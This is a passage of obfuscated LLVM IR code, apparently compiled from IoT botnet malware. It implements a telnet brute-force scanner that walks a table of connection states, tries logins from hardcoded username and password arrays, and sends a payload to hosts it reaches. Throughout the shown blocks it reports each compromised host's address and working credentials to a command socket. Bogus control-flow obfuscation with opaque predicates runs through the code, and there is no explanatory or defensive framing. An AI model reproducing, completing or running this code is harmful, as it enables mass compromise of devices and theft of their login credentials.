; <label>:1275:                                   ; preds = %1274, %1266
  %1276 = load i32, i32* %14, align 4
  %1277 = sext i32 %1276 to i64
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1277
  %1279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1278, i32 0, i32 0
  %1280 = load i32, i32* %1279, align 16
  %1281 = load i8*, i8** @payload, align 8
  %1282 = load i8*, i8** @payload, align 8
  %1283 = call i64 @strlen(i8* %1282) #9
  %1284 = call i64 @send(i32 %1280, i8* %1281, i64 %1283, i32 16384)
  %1285 = icmp slt i64 %1284, 0
  br i1 %1285, label %1286, label %1290

; <label>:1286:                                   ; preds = %1275
  %1287 = load i32, i32* %14, align 4
  %1288 = sext i32 %1287 to i64
  %1289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1288
  call void @reset_telstate(%struct.telstate_t* %1289)
  br label %1509

; <label>:1290:                                   ; preds = %1275
  %1291 = load i32, i32* @x.69
  %1292 = load i32, i32* @y.70
  %1293 = sub i32 %1291, 1
  %1294 = mul i32 %1291, %1293
  %1295 = urem i32 %1294, 2
  %1296 = icmp eq i32 %1295, 0
  %1297 = icmp slt i32 %1292, 10
  %1298 = or i1 %1296, %1297
  br i1 %1298, label %originalBB169, label %originalBB169alteredBB

originalBB169:                                    ; preds = %originalBB169alteredBB, %1290
  %1299 = load i32, i32* @mainCommSock, align 4
  %1300 = load i32, i32* %14, align 4
  %1301 = sext i32 %1300 to i64
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1301
  %1303 = call i8* @get_telstate_host(%struct.telstate_t* %1302)
  %1304 = load i32, i32* %14, align 4
  %1305 = sext i32 %1304 to i64
  %1306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1305
  %1307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1306, i32 0, i32 4
  %1308 = load i8, i8* %1307, align 2
  %1309 = zext i8 %1308 to i64
  %1310 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %1309
  %1311 = load i8*, i8** %1310, align 8
  %1312 = load i32, i32* %14, align 4
  %1313 = sext i32 %1312 to i64
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1313
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1314, i32 0, i32 5
  %1316 = load i8, i8* %1315, align 1
  %1317 = zext i8 %1316 to i64
  %1318 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %1317
  %1319 = load i8*, i8** %1318, align 8
  %1320 = call i32 (i32, i8*, ...) @sockprintf(i32 %1299, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.121, i32 0, i32 0), i8* %1303, i8* %1311, i8* %1319)
  %1321 = load i32, i32* %14, align 4
  %1322 = sext i32 %1321 to i64
  %1323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1322
  %1324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1323, i32 0, i32 0
  %1325 = load i32, i32* %1324, align 16
  %1326 = load i32, i32* %11, align 4
  %1327 = load i32, i32* %14, align 4
  %1328 = sext i32 %1327 to i64
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1328
  %1330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1329, i32 0, i32 9
  %1331 = load i8*, i8** %1330, align 8
  %1332 = call i32 @read_until_response(i32 %1325, i32 %1326, i8* %1331, i32 1024, i8** bitcast ([10 x i8]* @.str.122 to i8**))
  %1333 = icmp ne i32 %1332, 0
  %1334 = load i32, i32* @x.69
  %1335 = load i32, i32* @y.70
  %1336 = sub i32 %1334, 1
  %1337 = mul i32 %1334, %1336
  %1338 = urem i32 %1337, 2
  %1339 = icmp eq i32 %1338, 0
  %1340 = icmp slt i32 %1335, 10
  %1341 = or i1 %1339, %1340
  br i1 %1341, label %originalBBpart2171, label %originalBB169alteredBB

originalBBpart2171:                               ; preds = %originalBB169
  br i1 %1333, label %1342, label %1430

; <label>:1342:                                   ; preds = %originalBBpart2171
  %1343 = load i32, i32* @x.69
  %1344 = load i32, i32* @y.70
  %1345 = sub i32 %1343, 1
  %1346 = mul i32 %1343, %1345
  %1347 = urem i32 %1346, 2
  %1348 = icmp eq i32 %1347, 0
  %1349 = icmp slt i32 %1344, 10
  %1350 = or i1 %1348, %1349
  br i1 %1350, label %originalBB173, label %originalBB173alteredBB

originalBB173:                                    ; preds = %originalBB173alteredBB, %1342
  %1351 = load i32, i32* %14, align 4
  %1352 = sext i32 %1351 to i64
  %1353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1352
  %1354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1353, i32 0, i32 9
  %1355 = load i8*, i8** %1354, align 8
  %1356 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %1355, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.123, i32 0, i32 0))
  %1357 = icmp ne i32 %1356, 0
  %1358 = load i32, i32* @x.69
  %1359 = load i32, i32* @y.70
  %1360 = sub i32 %1358, 1
  %1361 = mul i32 %1358, %1360
  %1362 = urem i32 %1361, 2
  %1363 = icmp eq i32 %1362, 0
  %1364 = icmp slt i32 %1359, 10
  %1365 = or i1 %1363, %1364
  br i1 %1365, label %originalBBpart2175, label %originalBB173alteredBB

originalBBpart2175:                               ; preds = %originalBB173
  br i1 %1357, label %1366, label %1429

; <label>:1366:                                   ; preds = %originalBBpart2175
  %1367 = load i32, i32* @x.69
  %1368 = load i32, i32* @y.70
  %1369 = sub i32 %1367, 1
  %1370 = mul i32 %1367, %1369
  %1371 = urem i32 %1370, 2
  %1372 = icmp eq i32 %1371, 0
  %1373 = icmp slt i32 %1368, 10
  %1374 = or i1 %1372, %1373
  br i1 %1374, label %originalBB177, label %originalBB177alteredBB

originalBB177:                                    ; preds = %originalBB177alteredBB, %1366
  %1375 = load i32, i32* %14, align 4
  %1376 = sext i32 %1375 to i64
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1376
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1377, i32 0, i32 3
  %1379 = load i8, i8* %1378, align 1
  %1380 = zext i8 %1379 to i32
  %1381 = icmp ne i32 %1380, 3
  %1382 = load i32, i32* @x.69
  %1383 = load i32, i32* @y.70
  %1384 = sub i32 %1382, 1
  %1385 = mul i32 %1382, %1384
  %1386 = urem i32 %1385, 2
  %1387 = icmp eq i32 %1386, 0
  %1388 = icmp slt i32 %1383, 10
  %1389 = or i1 %1387, %1388
  br i1 %1389, label %originalBBpart2179, label %originalBB177alteredBB

originalBBpart2179:                               ; preds = %originalBB177
  br i1 %1381, label %1390, label %1429

; <label>:1390:                                   ; preds = %originalBBpart2179
  %1391 = load i32, i32* @x.69
  %1392 = load i32, i32* @y.70
  %1393 = sub i32 %1391, 1
  %1394 = mul i32 %1391, %1393
  %1395 = urem i32 %1394, 2
  %1396 = icmp eq i32 %1395, 0
  %1397 = icmp slt i32 %1392, 10
  %1398 = or i1 %1396, %1397
  br i1 %1398, label %originalBB181, label %originalBB181alteredBB

originalBB181:                                    ; preds = %originalBB181alteredBB, %1390
  %1399 = load i32, i32* @mainCommSock, align 4
  %1400 = load i32, i32* %14, align 4
  %1401 = sext i32 %1400 to i64
  %1402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1401
  %1403 = call i8* @get_telstate_host(%struct.telstate_t* %1402)
  %1404 = load i32, i32* %14, align 4
  %1405 = sext i32 %1404 to i64
  %1406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1405
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1406, i32 0, i32 4
  %1408 = load i8, i8* %1407, align 2
  %1409 = zext i8 %1408 to i64
  %1410 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %1409
  %1411 = load i8*, i8** %1410, align 8
  %1412 = load i32, i32* %14, align 4
  %1413 = sext i32 %1412 to i64
  %1414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1413
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1414, i32 0, i32 5
  %1416 = load i8, i8* %1415, align 1
  %1417 = zext i8 %1416 to i64
  %1418 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %1417
  %1419 = load i8*, i8** %1418, align 8
  %1420 = call i32 (i32, i8*, ...) @sockprintf(i32 %1399, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.124, i32 0, i32 0), i8* %1403, i8* %1411, i8* %1419)
  %1421 = load i32, i32* @x.69
  %1422 = load i32, i32* @y.70
  %1423 = sub i32 %1421, 1
  %1424 = mul i32 %1421, %1423
  %1425 = urem i32 %1424, 2
  %1426 = icmp eq i32 %1425, 0
  %1427 = icmp slt i32 %1422, 10
  %1428 = or i1 %1426, %1427
  br i1 %1428, label %originalBBpart2183, label %originalBB181alteredBB

originalBBpart2183:                               ; preds = %originalBB181
  br label %1429

; <label>:1429:                                   ; preds = %originalBBpart2183, %originalBBpart2179, %originalBBpart2175
  br label %1430

; <label>:1430:                                   ; preds = %1429, %originalBBpart2171
  %1431 = load i32, i32* %14, align 4
  %1432 = sext i32 %1431 to i64
  %1433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1432
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1433, i32 0, i32 7
  %1435 = load i32, i32* %1434, align 16
  %1436 = add i32 %1435, 45
  %1437 = zext i32 %1436 to i64
  %1438 = call i64 @time(i64* null) #5
  %1439 = icmp slt i64 %1437, %1438
  br i1 %1439, label %1440, label %1491

; <label>:1440:                                   ; preds = %1430
  %1441 = load i32, i32* @x.69
  %1442 = load i32, i32* @y.70
  %1443 = sub i32 %1441, 1
  %1444 = mul i32 %1441, %1443
  %1445 = urem i32 %1444, 2
  %1446 = icmp eq i32 %1445, 0
  %1447 = icmp slt i32 %1442, 10
  %1448 = or i1 %1446, %1447
  br i1 %1448, label %originalBB185, label %originalBB185alteredBB

originalBB185:                                    ; preds = %originalBB185alteredBB, %1440
  %1449 = load i32, i32* %14, align 4
  %1450 = sext i32 %1449 to i64
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1450
  %1452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1451, i32 0, i32 3
  %1453 = load i8, i8* %1452, align 1
  %1454 = zext i8 %1453 to i32
  %1455 = icmp ne i32 %1454, 3
  %1456 = load i32, i32* @x.69
  %1457 = load i32, i32* @y.70
  %1458 = sub i32 %1456, 1
  %1459 = mul i32 %1456, %1458
  %1460 = urem i32 %1459, 2
  %1461 = icmp eq i32 %1460, 0
  %1462 = icmp slt i32 %1457, 10
  %1463 = or i1 %1461, %1462
  br i1 %1463, label %originalBBpart2187, label %originalBB185alteredBB

originalBBpart2187:                               ; preds = %originalBB185
  br i1 %1455, label %1464, label %1487

; <label>:1464:                                   ; preds = %originalBBpart2187
  %1465 = load i32, i32* @mainCommSock, align 4
  %1466 = load i32, i32* %14, align 4
  %1467 = sext i32 %1466 to i64
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1467
  %1469 = call i8* @get_telstate_host(%struct.telstate_t* %1468)
  %1470 = load i32, i32* %14, align 4
  %1471 = sext i32 %1470 to i64
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1471
  %1473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1472, i32 0, i32 4
  %1474 = load i8, i8* %1473, align 2
  %1475 = zext i8 %1474 to i64
  %1476 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %1475
  %1477 = load i8*, i8** %1476, align 8
  %1478 = load i32, i32* %14, align 4
  %1479 = sext i32 %1478 to i64
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1479
  %1481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1480, i32 0, i32 5
  %1482 = load i8, i8* %1481, align 1
  %1483 = zext i8 %1482 to i64
  %1484 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %1483
  %1485 = load i8*, i8** %1484, align 8
  %1486 = call i32 (i32, i8*, ...) @sockprintf(i32 %1465, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.125, i32 0, i32 0), i8* %1469, i8* %1477, i8* %1485)
  br label %1487

; <label>:1487:                                   ; preds = %1464, %originalBBpart2187
  %1488 = load i32, i32* %14, align 4
  %1489 = sext i32 %1488 to i64
  %1490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1489
  call void @reset_telstate(%struct.telstate_t* %1490)
  br label %1491

; <label>:1491:                                   ; preds = %1487, %1430
  br label %1492

; <label>:1492:                                   ; preds = %1491, %1208, %1190, %975, %917, %830, %originalBBpart2111, %originalBBpart299, %originalBBpart257, %originalBBpart216
  %1493 = load i32, i32* @x.69
  %1494 = load i32, i32* @y.70
  %1495 = sub i32 %1493, 1
  %1496 = mul i32 %1493, %1495
  %1497 = urem i32 %1496, 2
  %1498 = icmp eq i32 %1497, 0
  %1499 = icmp slt i32 %1494, 10
  %1500 = or i1 %1498, %1499
  br i1 %1500, label %originalBB189, label %originalBB189alteredBB

originalBB189:                                    ; preds = %originalBB189alteredBB, %1492
  %1501 = load i32, i32* @x.69
  %1502 = load i32, i32* @y.70
  %1503 = sub i32 %1501, 1
  %1504 = mul i32 %1501, %1503
  %1505 = urem i32 %1504, 2
  %1506 = icmp eq i32 %1505, 0
  %1507 = icmp slt i32 %1502, 10
  %1508 = or i1 %1506, %1507
  br i1 %1508, label %originalBBpart2191, label %originalBB189alteredBB

originalBBpart2191:                               ; preds = %originalBB189
  br label %1509

; <label>:1509:                                   ; preds = %originalBBpart2191, %1286, %1204, %originalBBpart2159, %971, %959, %886, %originalBBpart2123, %originalBBpart2115, %709, %originalBBpart272, %521, %324, %277
  %1510 = load i32, i32* %14, align 4
  %1511 = add nsw i32 %1510, 1
  store i32 %1511, i32* %14, align 4
  br label %135

; <label>:1512:                                   ; preds = %135
  %1513 = load i32, i32* @x.69
  %1514 = load i32, i32* @y.70
  %1515 = sub i32 %1513, 1
  %1516 = mul i32 %1513, %1515
  %1517 = urem i32 %1516, 2
  %1518 = icmp eq i32 %1517, 0
  %1519 = icmp slt i32 %1514, 10
  %1520 = or i1 %1518, %1519
  br i1 %1520, label %originalBB193, label %originalBB193alteredBB

originalBB193:                                    ; preds = %originalBB193alteredBB, %1512
  %1521 = load i32, i32* @x.69
  %1522 = load i32, i32* @y.70
  %1523 = sub i32 %1521, 1
  %1524 = mul i32 %1521, %1523
  %1525 = urem i32 %1524, 2
  %1526 = icmp eq i32 %1525, 0
  %1527 = icmp slt i32 %1522, 10
  %1528 = or i1 %1526, %1527
  br i1 %1528, label %originalBBpart2195, label %originalBB193alteredBB

originalBBpart2195:                               ; preds = %originalBB193
  br label %133
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %1530 = alloca i32, align 4
  %1531 = alloca i32, align 4
  %1532 = alloca i32, align 4
  %1533 = alloca i32, align 4
  %1534 = alloca i32, align 4
  %1535 = alloca i32, align 4
  %1536 = alloca i32, align 4
  %1537 = alloca [128 x i8], align 16
  %1538 = alloca i8, align 1
  %1539 = alloca %struct.fd_set, align 8
  %1540 = alloca %struct.timeval, align 8
  %1541 = alloca i32, align 4
  %1542 = alloca i32, align 4
  %1543 = alloca [256 x i8], align 16
  %1544 = alloca i8*, align 8
  %1545 = alloca %struct.sockaddr_in, align 4
  %1546 = alloca i8*, align 8
  %1547 = alloca i8*, align 8
  %1548 = alloca i32, align 4
  %1549 = alloca i32, align 4
  %1550 = alloca [80 x i8], align 16
  store i32 %0, i32* %1530, align 4
  store i32 %1, i32* %1531, align 4
  %1551 = call i32 @getdtablesize() #5
  %_ = sub i32 %1551, 100
  %gen = mul i32 %_, 100
  %1552 = sub nsw i32 %1551, 100
  store i32 %1552, i32* %1532, align 4
  %1553 = load i32, i32* %1532, align 4
  %1554 = load i32, i32* %1531, align 4
  %1555 = icmp sgt i32 %1553, %1554
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  %1556 = load i32, i32* %12, align 4
  store i32 %1556, i32* %13, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %79
  %1557 = load i32, i32* %14, align 4
  %1558 = load i32, i32* %13, align 4
  %1559 = icmp slt i32 %1557, %1558
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %99
  %1560 = load i32, i32* %14, align 4
  %1561 = sext i32 %1560 to i64
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1561
  %1563 = bitcast %struct.telstate_t* %1562 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1563, i8 0, i64 32, i32 16, i1 false)
  %1564 = load i32, i32* %14, align 4
  %1565 = sext i32 %1564 to i64
  %1566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1565
  %1567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1566, i32 0, i32 3
  store i8 1, i8* %1567, align 1
  %1568 = load i8*, i8** %25, align 8
  %1569 = load i32, i32* %14, align 4
  %1570 = sext i32 %1569 to i64
  %1571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1570
  %1572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1571, i32 0, i32 9
  store i8* %1568, i8** %1572, align 8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %153
  %1573 = load i32, i32* %14, align 4
  %1574 = sext i32 %1573 to i64
  %1575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1574
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1575, i32 0, i32 2
  %1577 = load i8, i8* %1576, align 8
  %1578 = zext i8 %1577 to i32
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %176
  %1579 = load i32, i32* %14, align 4
  %1580 = sext i32 %1579 to i64
  %1581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1580
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1581, i32 0, i32 3
  %1583 = load i8, i8* %1582, align 1
  %1584 = zext i8 %1583 to i32
  %1585 = icmp eq i32 %1584, 1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %228
  %1586 = load i32, i32* %14, align 4
  %1587 = sext i32 %1586 to i64
  %1588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1587
  %1589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1588, i32 0, i32 4
  %1590 = load i8, i8* %1589, align 2
  %_23 = sub i8 0, %1590
  %gen24 = add i8 %_23, 1
  %_25 = sub i8 0, %1590
  %gen26 = add i8 %_25, 1
  %_27 = sub i8 %1590, 1
  %gen28 = mul i8 %_27, 1
  %_29 = sub i8 %1590, 1
  %gen30 = mul i8 %_29, 1
  %_31 = sub i8 %1590, 1
  %gen32 = mul i8 %_31, 1
  %1591 = add i8 %1590, 1
  store i8 %1591, i8* %1589, align 2
  %1592 = load i32, i32* %14, align 4
  %1593 = sext i32 %1592 to i64
  %1594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1593
  %1595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1594, i32 0, i32 5
  %1596 = load i8, i8* %1595, align 1
  %_33 = sub i8 %1596, 1
  %gen34 = mul i8 %_33, 1
  %_35 = shl i8 %1596, 1
  %1597 = add i8 %1596, 1
  store i8 %1597, i8* %1595, align 1
  %1598 = load i32, i32* %14, align 4
  %1599 = sext i32 %1598 to i64
  %1600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1599
  %1601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1600, i32 0, i32 5
  %1602 = load i8, i8* %1601, align 1
  %1603 = zext i8 %1602 to i64
  %1604 = icmp eq i64 %1603, 6
  br label %originalBB22

originalBB39alteredBB:                            ; preds = %originalBB39, %282
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %347
  %1605 = call i32* @__errno_location() #10
  %1606 = load i32, i32* %1605, align 4
  %1607 = icmp ne i32 %1606, 115
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %367
  %1608 = load i32, i32* %14, align 4
  %1609 = sext i32 %1608 to i64
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1609
  call void @reset_telstate(%struct.telstate_t* %1610)
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %387
  %1611 = load i32, i32* %14, align 4
  %1612 = sext i32 %1611 to i64
  %1613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1612
  call void @advance_telstate(%struct.telstate_t* %1613, i32 1)
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %407
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %488
  %1614 = load i32, i32* %14, align 4
  %1615 = sext i32 %1614 to i64
  %1616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1615
  %1617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1616, i32 0, i32 0
  %1618 = load i32, i32* %1617, align 16
  %1619 = load i32, i32* %14, align 4
  %1620 = sext i32 %1619 to i64
  %1621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1620
  %1622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1621, i32 0, i32 0
  %1623 = load i32, i32* %1622, align 16
  %1624 = call i32 (i32, i32, ...) @fcntl(i32 %1623, i32 3, i8* null)
  %_60 = shl i32 %1624, -2049
  %_61 = sub i32 0, %1624
  %gen62 = add i32 %_61, -2049
  %1625 = and i32 %1624, -2049
  %1626 = call i32 (i32, i32, ...) @fcntl(i32 %1618, i32 4, i32 %1625)
  %1627 = load i32, i32* %14, align 4
  %1628 = sext i32 %1627 to i64
  %1629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1628
  call void @advance_telstate(%struct.telstate_t* %1629, i32 2)
  br label %originalBB59

originalBB66alteredBB:                            ; preds = %originalBB66, %522
  %1630 = load i32, i32* %15, align 4
  %1631 = icmp eq i32 %1630, -1
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %541
  %1632 = load i32, i32* %14, align 4
  %1633 = sext i32 %1632 to i64
  %1634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1633
  call void @reset_telstate(%struct.telstate_t* %1634)
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %561
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %578
  %1635 = load i32, i32* %14, align 4
  %1636 = sext i32 %1635 to i64
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1636
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1637, i32 0, i32 7
  %1639 = load i32, i32* %1638, align 16
  %_79 = sub i32 %1639, 7
  %gen80 = mul i32 %_79, 7
  %_81 = sub i32 0, %1639
  %gen82 = add i32 %_81, 7
  %_83 = sub i32 %1639, 7
  %gen84 = mul i32 %_83, 7
  %_85 = sub i32 %1639, 7
  %gen86 = mul i32 %_85, 7
  %_87 = sub i32 %1639, 7
  %gen88 = mul i32 %_87, 7
  %_89 = shl i32 %1639, 7
  %1640 = add i32 %1639, 7
  %1641 = zext i32 %1640 to i64
  %1642 = call i64 @time(i64* null) #5
  %1643 = icmp slt i64 %1641, %1642
  br label %originalBB78

originalBB93alteredBB:                            ; preds = %originalBB93, %604
  %1644 = load i32, i32* %14, align 4
  %1645 = sext i32 %1644 to i64
  %1646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1645
  call void @reset_telstate(%struct.telstate_t* %1646)
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %624
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %655
  %1647 = call i64 @time(i64* null) #5
  %1648 = trunc i64 %1647 to i32
  %1649 = load i32, i32* %14, align 4
  %1650 = sext i32 %1649 to i64
  %1651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1650
  %1652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1651, i32 0, i32 7
  store i32 %1648, i32* %1652, align 16
  %1653 = load i32, i32* %14, align 4
  %1654 = sext i32 %1653 to i64
  %1655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1654
  %1656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1655, i32 0, i32 9
  %1657 = load i8*, i8** %1656, align 8
  %1658 = call i32 @contains_fail(i8* %1657)
  %1659 = icmp ne i32 %1658, 0
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %689
  %1660 = load i32, i32* %14, align 4
  %1661 = sext i32 %1660 to i64
  %1662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1661
  call void @advance_telstate(%struct.telstate_t* %1662, i32 3)
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %724
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %766
  %1663 = load i32, i32* %14, align 4
  %1664 = sext i32 %1663 to i64
  %1665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1664
  call void @reset_telstate(%struct.telstate_t* %1665)
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %786
  %1666 = load i32, i32* %14, align 4
  %1667 = sext i32 %1666 to i64
  %1668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1667
  %1669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1668, i32 0, i32 0
  %1670 = load i32, i32* %1669, align 16
  %1671 = call i64 @send(i32 %1670, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.115, i32 0, i32 0), i64 2, i32 16384)
  %1672 = icmp slt i64 %1671, 0
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %810
  %1673 = load i32, i32* %14, align 4
  %1674 = sext i32 %1673 to i64
  %1675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1674
  call void @reset_telstate(%struct.telstate_t* %1675)
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %866
  %1676 = load i32, i32* %14, align 4
  %1677 = sext i32 %1676 to i64
  %1678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1677
  call void @advance_telstate(%struct.telstate_t* %1678, i32 5)
  br label %originalBB125

originalBB129alteredBB:                           ; preds = %originalBB129, %887
  %1679 = load i32, i32* %14, align 4
  %1680 = sext i32 %1679 to i64
  %1681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1680
  %1682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1681, i32 0, i32 7
  %1683 = load i32, i32* %1682, align 16
  %1684 = add i32 %1683, 7
  %1685 = zext i32 %1684 to i64
  %1686 = call i64 @time(i64* null) #5
  %1687 = icmp slt i64 %1685, %1686
  br label %originalBB129

originalBB133alteredBB:                           ; preds = %originalBB133, %918
  %1688 = load i32, i32* %14, align 4
  %1689 = sext i32 %1688 to i64
  %1690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1689
  %1691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1690, i32 0, i32 0
  %1692 = load i32, i32* %1691, align 16
  %1693 = load i32, i32* %14, align 4
  %1694 = sext i32 %1693 to i64
  %1695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1694
  %1696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1695, i32 0, i32 5
  %1697 = load i8, i8* %1696, align 1
  %1698 = zext i8 %1697 to i64
  %1699 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %1698
  %1700 = load i8*, i8** %1699, align 8
  %1701 = load i32, i32* %14, align 4
  %1702 = sext i32 %1701 to i64
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1702
  %1704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1703, i32 0, i32 5
  %1705 = load i8, i8* %1704, align 1
  %1706 = zext i8 %1705 to i64
  %1707 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %1706
  %1708 = load i8*, i8** %1707, align 8
  %1709 = call i64 @strlen(i8* %1708) #9
  %1710 = call i64 @send(i32 %1692, i8* %1700, i64 %1709, i32 16384)
  %1711 = icmp slt i64 %1710, 0
  br label %originalBB133

originalBB137alteredBB:                           ; preds = %originalBB137, %1007
  %1712 = load i32, i32* %14, align 4
  %1713 = sext i32 %1712 to i64
  %1714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1713
  call void @advance_telstate(%struct.telstate_t* %1714, i32 0)
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %1027
  %1715 = load i32, i32* %14, align 4
  %1716 = sext i32 %1715 to i64
